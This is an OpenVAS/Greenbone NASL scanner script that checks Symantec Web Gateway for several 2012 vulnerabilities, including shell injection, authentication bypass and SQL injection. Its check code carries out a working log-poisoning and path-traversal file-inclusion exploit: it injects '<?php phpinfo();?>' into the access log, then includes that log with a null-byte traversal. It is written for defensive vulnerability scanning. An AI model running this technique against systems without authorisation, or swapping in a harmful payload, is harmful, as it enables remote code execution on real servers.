# SPDX-FileCopyrightText: 2012 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:symantec:web_gateway";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.802661");
  script_version("2023-07-25T05:05:58+0000");
  script_cve_id("CVE-2012-2953", "CVE-2012-2957", "CVE-2012-2574", "CVE-2012-2961",
                "CVE-2012-2976", "CVE-2012-2977");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_tag(name:"last_modification", value:"2023-07-25 05:05:58 +0000 (Tue, 25 Jul 2023)");
  script_tag(name:"creation_date", value:"2012-07-24 15:15:15 +0530 (Tue, 24 Jul 2012)");
  script_name("Symantec Web Gateway Multiple Vulnerabilities");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2012 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("gb_symantec_web_gateway_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("symantec_web_gateway/installed");

  script_xref(name:"URL", value:"http://secunia.com/advisories/50031");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/54424");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/54425");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/54426");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/54427");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/54429");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/54430");
  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/20038");
  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/20044");
  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/20064");
  script_xref(name:"URL", value:"http://www.symantec.com/security_response/securityupdates/detail.jsp?fid=security_advisory&pvid=security_advisory&suid=20120720_00");

  script_tag(name:"impact", value:"Successful exploitation will allow attackers to execute arbitrary code in
  the context of the application, bypass certain security restrictions and
  conduct SQL injection attacks.");

  script_tag(name:"affected", value:"Symantec Web Gateway versions 5.0.x before 5.0.3.18");

  script_tag(name:"insight", value:"- The application improperly validates certain input to multiple scripts via
    the management console and can be exploited to inject arbitrary shell
    commands.

  - An error within the authentication mechanism of the application can be
    exploited to bypass the authentication by modification of certain local
    files.

  - Certain unspecified input passed to the management console is not properly
    sanitised before being used in a SQL query. This can be exploited to
    manipulate SQL queries by injecting arbitrary SQL code.

  - The application improperly validates certain input via the management
    console and can be exploited to change the password of an arbitrary user
    of the application.");

  script_tag(name:"solution", value:"Upgrade to Symantec Web Gateway version 5.0.3.18 or later.");

  script_tag(name:"summary", value:"Symantec Web Gateway is prone to multiple vulnerabilities.");

  script_tag(name:"qod_type", value:"remote_vul");
  script_tag(name:"solution_type", value:"VendorFix");

  exit(0);
}

include("http_func.inc");
include("host_details.inc");

if(!port = get_app_port(cpe:CPE)){
  exit(0);
}

if(!dir = get_app_location(cpe:CPE, port:port)){
  exit(0);
}

if(dir == "/") dir = "";
exploit= 'GET ' + dir + '/<?php phpinfo();?> HTTP/1.1\r\n\r\n';
res = http_send_recv(port:port, data:exploit);

url = dir + "/spywall/languageTest.php?&language=../../../../../../../../usr/local/apache2/logs/access_log%00";
req = http_get(item:url, port:port);
res = http_send_recv(port:port, data:req);

if(res && res =~ "^HTTP/1\.[01] 200" && "<title>phpinfo()" >< res && ">Symantec Web Gateway<" >< res){
  report = http_report_vuln_url(port:port, url:url);
  security_message(port:port, data:report);
  exit(0);
}

exit(99);
